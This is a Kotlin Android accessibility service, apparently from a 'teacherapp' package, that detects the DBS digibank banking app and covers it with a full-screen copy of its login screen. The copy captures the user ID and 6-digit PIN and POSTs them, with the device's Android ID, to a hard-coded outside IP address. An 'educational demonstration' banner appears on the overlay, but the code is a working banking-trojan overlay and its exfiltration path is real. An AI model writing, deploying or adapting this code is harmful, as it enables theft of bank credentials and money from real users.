package com.example.teacherapp.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.graphics.drawable.Drawable
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.text.InputType
import android.util.Log
import android.util.TypedValue
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*

class RealisticDbsOverlay : AccessibilityService() {

    private val TAG = "DbsRealisticOverlay"
    private val TARGET_APP = "com.dbs.sg.dbsmbanking"

    // DBS Brand Colors
    private val DBS_RED = Color.parseColor("#E60000")
    private val DBS_WHITE = Color.WHITE
    private val DBS_BLACK = Color.parseColor("#000000")
    private val DBS_GRAY = Color.parseColor("#666666")
    private val DBS_INPUT_BG = Color.parseColor("#FFFFFF")
    private val DEMO_BANNER_BG = Color.parseColor("#FF5722")

    private var overlayView: View? = null
    private var windowManager: WindowManager? = null

    // ✅ FIX: Use a flag to prevent double-showing
    @Volatile
    private var isOverlayShowing = false

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "🏦 Realistic DBS Overlay Service Started")

        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

        // ✅ FIX: Also listen for TYPE_WINDOWS_CHANGED to catch app switches reliably
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_WINDOWS_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            notificationTimeout = 100
        }
        serviceInfo = info
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val packageName = event.packageName?.toString() ?: return

        if (packageName == TARGET_APP && !isOverlayShowing) {
            Log.d(TAG, "🏦 DBS app detected - showing realistic login overlay")
            isOverlayShowing = true  // Set flag immediately to prevent race

            // ✅ FIX: Use Looper.getMainLooper() explicitly
            Handler(Looper.getMainLooper()).postDelayed({
                if (overlayView == null) {
                    showDbsLoginOverlay()
                }
            }, 500)
        }
    }

    private fun showDbsLoginOverlay() {
        try {
            overlayView = createDbsLoginScreen()

            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                } else {
                    @Suppress("DEPRECATION")
                    WindowManager.LayoutParams.TYPE_PHONE
                },
                // ✅ FIX: Removed FLAG_NOT_TOUCH_MODAL so the overlay
                // captures ALL touches and the real app can't be interacted with
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                        WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                PixelFormat.TRANSLUCENT
            )

            windowManager?.addView(overlayView, params)
            Log.d(TAG, "✅ Realistic DBS login overlay displayed")

        } catch (e: Exception) {
            Log.e(TAG, "Error showing overlay: ${e.message}")
            isOverlayShowing = false  // Reset flag on failure
            e.printStackTrace()
        }
    }

    private fun createDbsLoginScreen(): View {
        return LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(DBS_WHITE)
            layoutParams = ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )
            addView(createDemoBanner())
            addView(createLoginContent())
        }
    }

    private fun createDemoBanner(): View {
        return LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(DEMO_BANNER_BG)
            setPadding(dp(16), dp(12), dp(16), dp(12))

            addView(TextView(this@RealisticDbsOverlay).apply {
                text = "⚠️ EDUCATIONAL DEMONSTRATION ⚠️"
                textSize = 14f
                setTextColor(DBS_WHITE)
                gravity = Gravity.CENTER
                typeface = Typeface.DEFAULT_BOLD
            })

            addView(TextView(this@RealisticDbsOverlay).apply {
                text = "This is a replica showing how phishing works • Enter fake data only"
                textSize = 11f
                setTextColor(DBS_WHITE)
                gravity = Gravity.CENTER
                setPadding(0, dp(4), 0, 0)
            })
        }
    }

    private fun createLoginContent(): View {
        return LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(DBS_WHITE)
            layoutParams = ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )

            addView(createSpacer(40))
            addView(createHeader())
            addView(createSpacer(48))

            val userIdField = createInputField("User ID")
            addView(userIdField)
            addView(createSpacer(20))

            val pinField = createPinField()
            addView(pinField)
            addView(createSpacer(32))

            addView(createLoginButton(userIdField, pinField))
            addView(createSpacer(24))
            addView(createLoginOptions())
            addView(createBottomNote())
        }
    }

    private fun createHeader(): View {
        return LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            setPadding(dp(32), 0, dp(32), 0)

            addView(TextView(this@RealisticDbsOverlay).apply {
                text = "DBS"
                textSize = 32f
                setTextColor(DBS_RED)
                typeface = Typeface.DEFAULT_BOLD
                gravity = Gravity.CENTER
            })

            addView(TextView(this@RealisticDbsOverlay).apply {
                text = "digibank"
                textSize = 18f
                setTextColor(DBS_BLACK)
                gravity = Gravity.CENTER
                setPadding(0, dp(4), 0, 0)
            })

            addView(TextView(this@RealisticDbsOverlay).apply {
                text = "Login to continue"
                textSize = 14f
                setTextColor(DBS_GRAY)
                gravity = Gravity.CENTER
                setPadding(0, dp(24), 0, 0)
            })
        }
    }

    private fun createInputField(hint: String): EditText {
        return EditText(this).apply {
            this.hint = hint
            textSize = 16f
            setTextColor(DBS_BLACK)
            setHintTextColor(DBS_GRAY)
            setPadding(dp(20), dp(16), dp(20), dp(16))
            background = createInputBackground()

            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply {
                setMargins(dp(32), 0, dp(32), 0)
            }
        }
    }

    private fun createPinField(): EditText {
        return EditText(this).apply {
            hint = "6-Digit PIN"
            textSize = 16f
            setTextColor(DBS_BLACK)
            setHintTextColor(DBS_GRAY)
            inputType = InputType.TYPE_CLASS_NUMBER or InputType.TYPE_NUMBER_VARIATION_PASSWORD
            setPadding(dp(20), dp(16), dp(20), dp(16))
            background = createInputBackground()

            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply {
                setMargins(dp(32), 0, dp(32), 0)
            }
        }
    }

    private fun createLoginButton(userIdField: EditText, pinField: EditText): Button {
        return Button(this).apply {
            text = "Login"
            textSize = 16f
            setTextColor(DBS_WHITE)
            setBackgroundColor(DBS_RED)
            typeface = Typeface.DEFAULT_BOLD
            isAllCaps = false

            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                dp(50)
            ).apply {
                setMargins(dp(32), 0, dp(32), 0)
            }

            setOnClickListener {
                val userId = userIdField.text.toString()
                val pin = pinField.text.toString()

                if (userId.isNotEmpty() && pin.isNotEmpty()) {
                    captureCredentials(userId, pin)
                } else {
                    Toast.makeText(
                        this@RealisticDbsOverlay,
                        "Please enter User ID and PIN for demo",
                        Toast.LENGTH_SHORT
                    ).show()
                }
            }
        }
    }

    private fun createLoginOptions(): View {
        return LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            setPadding(dp(32), 0, dp(32), 0)

            addView(TextView(this@RealisticDbsOverlay).apply {
                text = "Forgot User ID or PIN?"
                textSize = 14f
                setTextColor(DBS_RED)
                gravity = Gravity.CENTER
                setPadding(0, 0, 0, dp(12))
            })

            addView(TextView(this@RealisticDbsOverlay).apply {
                text = "Activate digibank"
                textSize = 14f
                setTextColor(DBS_RED)
                gravity = Gravity.CENTER
            })
        }
    }

    private fun createBottomNote(): View {
        return LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL or Gravity.BOTTOM
            setPadding(dp(32), 0, dp(32), dp(24))

            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                0
            ).apply { weight = 1f }

            addView(TextView(this@RealisticDbsOverlay).apply {
                text = "💡 Real phishing looks exactly like this\nwithout the orange banner"
                textSize = 11f
                setTextColor(DBS_GRAY)
                gravity = Gravity.CENTER
                setPadding(dp(16), dp(16), dp(16), dp(16))
                setBackgroundColor(Color.parseColor("#FFF3E0"))
            })
        }
    }

    private fun createInputBackground(): Drawable {
        return GradientDrawable().apply {
            setColor(DBS_WHITE)
            setStroke(2, Color.parseColor("#E0E0E0"))
            cornerRadius = dp(8).toFloat()
        }
    }

    private fun createSpacer(heightDp: Int): View {
        return View(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                dp(heightDp)
            )
        }
    }

    private fun dp(value: Int): Int {
        return TypedValue.applyDimension(
            TypedValue.COMPLEX_UNIT_DIP,
            value.toFloat(),
            resources.displayMetrics
        ).toInt()
    }

    private fun captureCredentials(userId: String, pin: String) {
        Log.d(TAG, "═══════════════════════════════════════")
        Log.d(TAG, "📋 CREDENTIALS CAPTURED (EDUCATIONAL DEMO)")
        Log.d(TAG, "═══════════════════════════════════════")
        Log.d(TAG, "App: DBS digibank")
        Log.d(TAG, "User ID: $userId")
        Log.d(TAG, "PIN: ${"*".repeat(pin.length)} (${pin.length} digits)")
        Log.d(TAG, "Time: ${formatTime(System.currentTimeMillis())}")
        Log.d(TAG, "═══════════════════════════════════════")

        exfiltrateCredentials(userId, pin)
        removeOverlay()

        Toast.makeText(
            this,
            "✅ Demo: Credentials captured\nCheck your dashboard",
            Toast.LENGTH_LONG
        ).show()
    }

    private fun removeOverlay() {
        overlayView?.let {
            try {
                windowManager?.removeView(it)
                overlayView = null
                isOverlayShowing = false  // ✅ FIX: Reset flag on removal
                Log.d(TAG, "🗑️ Overlay removed")
            } catch (e: Exception) {
                Log.e(TAG, "Error removing overlay: ${e.message}")
            }
        }
    }

    private fun exfiltrateCredentials(userId: String, pin: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val data = JSONObject().apply {
                    put("type", "phishing_demo")
                    put("app_package", TARGET_APP)
                    put("app_name", "DBS digibank")
                    put("user_id", userId)
                    put("pin",pin)
                    put("pin_length", pin.length)
                    put("android_id", getAndroidId())
                    put("timestamp", System.currentTimeMillis())
                    put("time_formatted", formatTime(System.currentTimeMillis()))
                    put("demo_note", "Realistic overlay - educational demo")
                }

                val url = URL("http://20.189.79.25:5000/api/phishing_demo")
                val connection = url.openConnection() as HttpURLConnection
                connection.apply {
                    requestMethod = "POST"
                    doOutput = true
                    setRequestProperty("Content-Type", "application/json")
                    connectTimeout = 10000
                    readTimeout = 10000
                }

                OutputStreamWriter(connection.outputStream).use { writer ->
                    writer.write(data.toString())
                    writer.flush()
                }

                val responseCode = connection.responseCode
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    Log.d(TAG, "✅ Demo data sent to server")
                } else {
                    Log.e(TAG, "❌ Server error: $responseCode")
                }
                connection.disconnect()

            } catch (e: Exception) {
                Log.e(TAG, "Error sending data: ${e.message}")
            }
        }
    }

    private fun formatTime(timestamp: Long): String {
        return SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
            .format(Date(timestamp))
    }

    private fun getAndroidId(): String {
        return android.provider.Settings.Secure.getString(
            contentResolver,
            android.provider.Settings.Secure.ANDROID_ID
        ) ?: "unknown"
    }

    override fun onInterrupt() {
        removeOverlay()
    }

    override fun onDestroy() {
        super.onDestroy()
        removeOverlay()
    }
}